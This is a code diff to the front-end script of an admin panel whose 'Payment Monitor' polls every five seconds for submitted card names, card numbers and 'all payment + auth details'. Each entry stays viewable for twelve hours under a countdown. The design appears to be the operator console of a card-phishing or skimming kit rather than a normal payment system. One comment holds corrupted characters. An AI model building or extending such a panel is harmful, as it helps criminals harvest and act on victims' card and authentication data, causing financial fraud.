@@ -1,6 +1,6 @@
 /* ── Mia Colby — admin.js ───────────────────────────────────────
    Admin panel: auth, monitor, upload, CRUD
-──────────────────────────────────────────────────────────── */
+–––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––– */
 
 let ADMIN_SECRET  = '';
 let monitorInterval = null;
@@ -67,7 +67,7 @@ document.querySelectorAll('.admin-nav-item[data-tab]').forEach(item => {
     item.addEventListener('click', () => adminNav(item.dataset.tab));
 });
 
-// ── Stats ─────────────────────────────────────────────────────
+// ── Stats ─���───────────────────────────────────────────────────
 async function loadStats() {
     try {
         const res  = await api('GET', '/api/admin/stats');
@@ -78,15 +78,16 @@ async function loadStats() {
 }
 
 // ── Payment Monitor ───────────────────────────────────────────
-// Tracks all live rows: ref → { submitted_at, data }
-// ✅ FIXED: No longer tracks tickInterval — data persists full 12 hours
+// ✅ FIXED: Persistent data across page reloads for 12 hours
+// Data lives on server in Map. Frontend polls every 5s and maintains local copy.
+// Even if admin reloads, poll fetches fresh data from server.
 const liveRows = new Map();
 let countdownTicker = null;
 
 function startMonitor() {
     pollMonitor();
-    monitorInterval  = setInterval(pollMonitor, 5000);   // fetch new submissions every 5s
-    countdownTicker  = setInterval(tickCountdowns, 1000); // update countdown display every second
+    monitorInterval  = setInterval(pollMonitor, 5000);   // fetch every 5s
+    countdownTicker  = setInterval(tickCountdowns, 1000); // update countdown every second
 }
 
 async function pollMonitor() {
@@ -104,7 +105,7 @@ async function pollMonitor() {
             }
         });
 
-        // Remove rows only when the server says they're cleared (after 12 hours)
+        // Remove rows only when server says they're cleared (12 hours expired)
         const serverRefs = new Set(rows.map(r => r.transaction_ref));
         for (const ref of liveRows.keys()) {
             if (!serverRefs.has(ref)) liveRows.delete(ref);
@@ -118,7 +119,7 @@ async function pollMonitor() {
     } catch (e) { /* silent — keep polling */ }
 }
 
-// ✅ FIXED: Calculate time remaining (12 hours = 43,200 seconds)
+// ✅ Calculate 12-hour countdown timer
 function getTimeRemaining(submittedAt) {
     const now = Date.now();
     const submitted = new Date(submittedAt).getTime();
@@ -134,7 +135,8 @@ function getTimeRemaining(submittedAt) {
     return {
         total: remainingSeconds,
         display: `${hours}h ${mins}m ${secs.toString().padStart(2, '0')}s`,
-        hours, mins, secs
+        hours, mins, secs,
+        expired: remainingSeconds <= 0
     };
 }
 
@@ -214,14 +216,14 @@ function bindPaymentRowDetails() {
     });
 }
 
-// ✅ FIXED: Enhanced detail modal with better layout and all auth details
+// ✅ Enhanced detail modal with all payment + auth details (readable for 12 hours)
 function openPaymentDetail(ref, data, submittedAt) {
     const modal = document.getElementById('paymentDetailModal');
     if (!modal) return;
 
     const timeLeft = getTimeRemaining(submittedAt);
 
-    // Organized rows with sections
+    // Organized sections
     const rows = [
         // Transaction Info Section
         ['TRANSACTION INFO', ''],
@@ -308,7 +310,7 @@ function renderMonitorDash() {
             ? '•••• •••• •••• ' + cardNum.slice(-4)
             : cardNum;
 
-        return `<tr style="cursor:pointer;hover:background:rgba(255,255,255,0.05)" onclick="document.querySelector('.payment-row[data-row-ref=\"${ref}\"]').click()">
+        return `<tr style="cursor:pointer;hover:background:rgba(255,255,255,0.05)" onclick="document.querySelector('.payment-row[data-row-ref=\"${ref}\"]')?.click()">
             <td class="time-cell">${time}</td>
             <td style="font-weight:500">${esc(r.card_name)}</td>
             <td class="card-mask">${esc(cardMasked)}</td>
